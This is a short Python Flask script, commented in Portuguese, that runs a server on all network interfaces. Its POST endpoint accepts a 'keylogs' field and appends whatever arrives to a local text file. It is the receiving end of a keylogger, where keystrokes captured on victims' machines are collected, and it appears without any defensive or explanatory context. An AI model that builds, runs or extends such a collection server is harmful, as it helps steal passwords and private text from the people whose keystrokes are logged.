from flask import Flask, request

app = Flask(__name__)


@app.route('/receber_dados', methods=['POST'])
def receber_dados():
    keylogs = request.form.get('keylogs')

    # Verifica se alguma coisa foi enviada
    if not keylogs or not keylogs.strip():
        return 'Nenhum dado recebido.', 400

    # Salva os dados no arquivo
    with open('keylogs_recebidos.txt', 'a', encoding='utf-8') as log:
        log.write(keylogs + '\n')

    return 'Dados recebidos.', 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
